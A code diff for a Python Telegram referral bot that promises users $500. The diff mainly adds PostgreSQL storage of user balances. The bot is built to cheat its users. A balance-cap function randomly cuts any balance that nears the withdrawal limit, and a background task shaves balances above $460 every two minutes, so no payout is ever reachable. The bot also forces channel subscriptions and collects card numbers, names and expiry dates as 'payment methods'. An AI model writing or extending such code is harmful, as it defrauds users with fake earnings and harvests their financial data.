@@ -1,24 +1,88 @@
 import asyncio
 import random
 import os
+import json
+import psycopg2
+from psycopg2.extras import RealDictCursor
+from dotenv import load_dotenv
+
+load_dotenv()
+
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
-from dotenv import load_dotenv  # ← أضف هذا السطر
-load_dotenv()  # ← وأضف هذا السطر
 
 # ========================= إعدادات أساسية =========================
 TOKEN = os.environ["BOT_TOKEN"]
 ADMIN_ID = int(os.environ["ADMIN_ID"])
 
 DEFAULT_CHANNEL = "@ForexNews24hours"
-BOT_USERNAME = "get500dollar_bot"  # ✅ بدون @
+BOT_USERNAME = "get500dollar_bot"
 
-# قواعد بيانات مؤقتة في الذاكرة
+# سيتم تحميل المستخدمين من قاعدة البيانات
 users = {}
+
 withdraw_limit = 500
 SUB_CHANNELS = [DEFAULT_CHANNEL]
 referral_reward = 1.0
 
+# ========================= دوال قاعدة البيانات =========================
+def get_db_connection():
+    return psycopg2.connect(os.environ["DATABASE_URL"], cursor_factory=RealDictCursor)
+
+def init_db():
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute("""
+        CREATE TABLE IF NOT EXISTS users (
+            user_id BIGINT PRIMARY KEY,
+            name TEXT,
+            balance REAL DEFAULT 0,
+            invites TEXT DEFAULT '[]'
+        )
+    """)
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def load_users_from_db():
+    global users
+    users = {}
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute("SELECT user_id, name, balance, invites FROM users")
+    for row in cur.fetchall():
+        uid = row["user_id"]
+        invites_list = json.loads(row["invites"]) if row["invites"] else []
+        users[uid] = {
+            "name": row["name"],
+            "balance": float(row["balance"]),
+            "invites": set(invites_list),
+            "subscribed": True,
+            "pending_pay": None,
+            "pending_pay_info": None,
+            "pending_inviter": None
+        }
+    cur.close()
+    conn.close()
+
+def save_user_to_db(uid, data):
+    conn = get_db_connection()
+    cur = conn.cursor()
+    invites_json = json.dumps(list(data["invites"]))
+    cur.execute("""
+        INSERT INTO users (user_id, name, balance, invites)
+        VALUES (%s, %s, %s, %s)
+        ON CONFLICT (user_id)
+        DO UPDATE SET
+            name = EXCLUDED.name,
+            balance = EXCLUDED.balance,
+            invites = EXCLUDED.invites
+    """, (uid, data["name"], data["balance"], invites_json))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+# ========================= باقي الإعدادات والرسائل =========================
 MESSAGES = {
     "main_menu": (
         "مرحباً بك في البوت الربحي!\n"
@@ -33,7 +97,6 @@ MESSAGES = {
     "admin_settings": "لوحة الإعدادات الإدارية:\n• الحد الأدنى للسحب: {limit}$\n• ربح الإحالة: {referral}$\nاختر من التالي:"
 }
 
-# ========================= طرق الدفع =========================
 PAY_METHODS = [
     ("💵 PayPal (عالمي)", "أرسل بريد بوابة PayPal الخاصة بك"),
     ("💳 Visa/MasterCard (عالمي)", "أرسل رقم البطاقة والاسم وتاريخ الانتهاء"),
@@ -72,15 +135,10 @@ PAY_METHODS = [
     ("📦 كاش يو (دول عربية)", "أرسل بريد حساب كاش يو"),
 ]
 
-# ========================= دالة ضبط الرصيد عند تجاوز 470 =========================
+# ========================= دالة خفض الرصيد =========================
 def apply_balance_cap(user_data):
-    """
-    تخفض الرصيد فورًا ومتكررًا حتى يصبح أقل من 485$،
-    باستخدام القاعدة: (balance - (balance % 470)) - random(1..10)
-    """
     while user_data["balance"] >= 485:
         balance = user_data["balance"]
-        # إذا كان الرصيد بين 485 و 469 (أقل من 470)، نخسر جزءًا عشوائيًا مباشرًا
         if balance < 470:
             deduction = random.randint(1, min(10, balance))
             new_balance = max(0, balance - deduction)
@@ -89,13 +147,11 @@ def apply_balance_cap(user_data):
             base = balance - remainder
             deduction = random.randint(1, 10)
             new_balance = max(0, base - deduction)
-        
-        # تجنب الحلقة اللانهائية
         if new_balance >= balance:
             break
-        
         user_data["balance"] = new_balance
-# ========================= لوحات الأزرار =========================
+
+# ========================= لوحات الأزرار (بدون تغيير) =========================
 def keyboard_subscribe():
     channel = DEFAULT_CHANNEL
     btns = [
@@ -161,7 +217,7 @@ def keyboard_edit_msgs():
     btns.append([InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")])
     return InlineKeyboardMarkup(btns)
 
-# ========================= دالة آمنة لتعديل الرسائل =========================
+# ========================= دوال مساعدة (بدون تغيير كبير) =========================
 async def safe_edit_message_text(query, new_text, new_markup=None, parse_mode=None):
     try:
         if query.message and query.message.text == new_text and (new_markup is None or query.message.reply_markup == new_markup):
@@ -171,7 +227,6 @@ async def safe_edit_message_text(query, new_text, new_markup=None, parse_mode=No
     except Exception as e:
         print("DEBUG: edit_message_text error:", e)
 
-# ========================= التحقق من الاشتراك =========================
 async def are_subscribed_all(context, uid):
     if uid == ADMIN_ID:
         return True
@@ -187,15 +242,16 @@ async def are_subscribed_all(context, uid):
 
 async def check_subscription_and_respond(update, context, message_type='message'):
     uid = update.effective_user.id
-    users.setdefault(uid, {
-        "invites": set(),
-        "balance": 0,
-        "name": update.effective_user.full_name,
-        "subscribed": False,
-        "pending_pay": None,
-        "pending_pay_info": None,
-        "pending_inviter": None
-    })
+    if uid not in users:
+        users[uid] = {
+            "invites": set(),
+            "balance": 0,
+            "name": update.effective_user.full_name,
+            "subscribed": False,
+            "pending_pay": None,
+            "pending_pay_info": None,
+            "pending_inviter": None
+        }
     if uid == ADMIN_ID:
         users[uid]['subscribed'] = True
         return True
@@ -212,6 +268,8 @@ async def check_subscription_and_respond(update, context, message_type='message'
                     apply_balance_cap(users[inviter])
                     users[uid]["balance"] += referral_reward
                     apply_balance_cap(users[uid])
+                    save_user_to_db(inviter, users[inviter])
+                    save_user_to_db(uid, users[uid])
                     try:
                         await context.bot.send_message(
                             chat_id=inviter,
@@ -249,7 +307,7 @@ async def check_subscription_and_respond(update, context, message_type='message'
         print("DEBUG: failed to notify admin about permission issue:", e)
     return False
 
-# ========================= أوامر البداية =========================
+# ========================= الأوامر والمعالجات (مع تعديل الحفظ) =========================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     text = update.message.text if update.message and update.message.text else ""
@@ -260,46 +318,41 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             inviter = int(parts[1])
         except:
             inviter = None
-
-    users.setdefault(uid, {
-        "invites": set(),
-        "balance": 0,
-        "name": update.effective_user.full_name,
-        "subscribed": False,
-        "pending_pay": None,
-        "pending_pay_info": None,
-        "pending_inviter": None
-    })
-
-    # ✅ منع إعادة تعيين pending_inviter إذا كان المستخدم مشتركًا أو سبق دعوته
+    if uid not in users:
+        users[uid] = {
+            "invites": set(),
+            "balance": 0,
+            "name": update.effective_user.full_name,
+            "subscribed": False,
+            "pending_pay": None,
+            "pending_pay_info": None,
+            "pending_inviter": None
+        }
     if inviter and not users[uid]['subscribed'] and users[uid].get('pending_inviter') is None:
         if inviter != uid:
             users[uid]['pending_inviter'] = inviter
-
     if not await check_subscription_and_respond(update, context):
         return
-
     await update.message.reply_text(MESSAGES["main_menu"], reply_markup=keyboard_main(uid), parse_mode="Markdown")
 
-# ========================= معالجة أزرار =========================
 async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global withdraw_limit, referral_reward
     query = update.callback_query
     uid = query.from_user.id
     data = query.data
-
     if data == "verify_subs":
         checked = await are_subscribed_all(context, uid)
         if checked is True:
-            users.setdefault(uid, {
-                "invites": set(),
-                "balance": 0,
-                "name": query.from_user.full_name,
-                "subscribed": True,
-                "pending_pay": None,
-                "pending_pay_info": None,
-                "pending_inviter": None
-            })
+            if uid not in users:
+                users[uid] = {
+                    "invites": set(),
+                    "balance": 0,
+                    "name": query.from_user.full_name,
+                    "subscribed": True,
+                    "pending_pay": None,
+                    "pending_pay_info": None,
+                    "pending_inviter": None
+                }
             users[uid]['subscribed'] = True
             pending = users[uid].get('pending_inviter')
             if pending:
@@ -311,6 +364,8 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         apply_balance_cap(users[inviter])
                         users[uid]["balance"] += referral_reward
                         apply_balance_cap(users[uid])
+                        save_user_to_db(inviter, users[inviter])
+                        save_user_to_db(uid, users[uid])
                         try:
                             await context.bot.send_message(
                                 chat_id=inviter,
@@ -331,10 +386,8 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "⚠️ تعذر التحقق آلياً.\nتأكد من أن البوت عضو/مشرف في القناة ثم حاول مرة أخرى.\nتم إعلام المدير إذا لزم الأمر.",
                 keyboard_subscribe())
             return
-
     if not await check_subscription_and_respond(update, context, message_type='callback'):
         return
-
     if data == "settings":
         msg = MESSAGES["admin_settings"].format(limit=withdraw_limit, referral=referral_reward)
         await safe_edit_message_text(query, msg, keyboard_admin_menu())
@@ -384,6 +437,13 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if param.isdigit():
             target = int(param)
             users.pop(target, None)
+            # حذف من قاعدة البيانات
+            conn = get_db_connection()
+            cur = conn.cursor()
+            cur.execute("DELETE FROM users WHERE user_id = %s", (target,))
+            conn.commit()
+            cur.close()
+            conn.close()
             await safe_edit_message_text(query, "تم حذف/حظر المستخدم (تمت إزالة بياناته).", keyboard_admin_users())
         return
     if data == "set_limit" and uid == ADMIN_ID:
@@ -447,24 +507,21 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await safe_edit_message_text(query, msg, keyboard_main(uid))
         return
 
-# ========================= معالجة الرسائل النصية =========================
 async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global withdraw_limit, MESSAGES, referral_reward
     uid = update.effective_user.id
-
-    users.setdefault(uid, {
-        "invites": set(),
-        "balance": 0,
-        "name": update.effective_user.full_name,
-        "subscribed": False,
-        "pending_pay": None,
-        "pending_pay_info": None,
-        "pending_inviter": None
-    })
-
+    if uid not in users:
+        users[uid] = {
+            "invites": set(),
+            "balance": 0,
+            "name": update.effective_user.full_name,
+            "subscribed": False,
+            "pending_pay": None,
+            "pending_pay_info": None,
+            "pending_inviter": None
+        }
     if uid == ADMIN_ID and 'op' in context.user_data:
         op = context.user_data['op']
-
         if op == 'edit_referral':
             try:
                 val = float(update.message.text.strip())
@@ -480,7 +537,6 @@ async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
             context.user_data.pop('op', None)
             return
-
         if op == 'broadcast':
             text = update.message.text
             for u in list(users.keys()):
@@ -491,7 +547,6 @@ async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("✅ تم إرسال الرسالة للجميع.", reply_markup=keyboard_admin_menu())
             context.user_data.pop('op', None)
             return
-
         if op == 'edit_msg':
             key = context.user_data.get('msg_key')
             if key in MESSAGES:
@@ -505,7 +560,6 @@ async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data.pop('op', None)
             context.user_data.pop('msg_key', None)
             return
-
         if op == 'set_limit':
             try:
                 val = abs(int(update.message.text.strip()))
@@ -521,7 +575,6 @@ async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
             context.user_data.pop('op', None)
             return
-
         if 'admin_target' in context.user_data:
             target = context.user_data['admin_target']
             try:
@@ -534,16 +587,17 @@ async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 context.user_data.pop('op', None)
                 context.user_data.pop('admin_target', None)
                 return
-
             if op == 'add':
                 users[target]['balance'] += val
                 apply_balance_cap(users[target])
+                save_user_to_db(target, users[target])
                 await update.message.reply_text(
                     f"✅ تم رفع رصيد {users[target]['name']} إلى {users[target]['balance']}$",
                     reply_markup=keyboard_user_edit(target)
                 )
             elif op == 'dec':
                 users[target]['balance'] = max(0, users[target]['balance'] - val)
+                save_user_to_db(target, users[target])
                 await update.message.reply_text(
                     f"✅ تم خصم الرصيد وأصبح: {users[target]['balance']}$",
                     reply_markup=keyboard_user_edit(target)
@@ -551,10 +605,8 @@ async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data.pop('op', None)
             context.user_data.pop('admin_target', None)
             return
-
     if not await check_subscription_and_respond(update, context):
         return
-
     if users.get(uid, {}).get("pending_pay") is not None:
         index = users[uid]["pending_pay"]
         payname, paymsg = PAY_METHODS[index]
@@ -576,26 +628,27 @@ async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup=keyboard_main(uid)
             )
         return
-
     await update.message.reply_text(MESSAGES["main_menu"], reply_markup=keyboard_main(uid), parse_mode="Markdown")
 
-# ========================= وظائف تلقائية =========================
 async def auto_decrease():
     while True:
         try:
             for uid in list(users.keys()):
                 curr_balance = users[uid]["balance"]
-                if curr_balance > 440:
+                if curr_balance > 460:
                     dec = random.choice([2, 4])
                     users[uid]["balance"] = max(0, curr_balance - dec)
+                    save_user_to_db(uid, users[uid])
         except Exception as e:
             print("DEBUG: auto_decrease error:", e)
         await asyncio.sleep(120)
 
 async def post_init(application):
+    init_db()
+    load_users_from_db()
     application.create_task(auto_decrease())
 
-# ========================= تشغيل البوت =========================
+# ========================= التشغيل =========================
 if __name__ == "__main__":
     application = Application.builder().token(TOKEN).post_init(post_init).build()
     application.add_handler(CommandHandler("start", start))
